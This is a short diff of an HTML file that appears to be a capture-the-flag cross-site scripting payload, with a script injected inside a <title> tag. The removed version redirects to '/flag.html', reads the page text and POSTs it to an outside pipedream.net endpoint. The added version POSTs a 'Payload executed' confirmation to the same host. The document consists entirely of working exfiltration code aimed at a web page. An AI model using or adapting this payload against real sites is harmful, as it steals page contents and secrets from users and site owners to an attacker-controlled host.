@@ -2,15 +2,11 @@
 <html>
 <head>
     <title><script>
-    window.location.href = '/flag.html';
-    window.onload = () => {
-        const flag = document.body.innerText || document.body.textContent;
-        fetch('https://eownbmaqeyx6p8e.m.pipedream.net', {
-          method: 'POST',
-          body: flag
-        })
-        .catch(error => console.error('Error sending flag:', error));
-    };
+    console.log('Payload executed');
+    fetch('https://eownbmaqeyx6p8e.m.pipedream.net', {
+      method: 'POST',
+      body: 'Payload executed'
+    });
     </script></title>
 </head>
 <body>
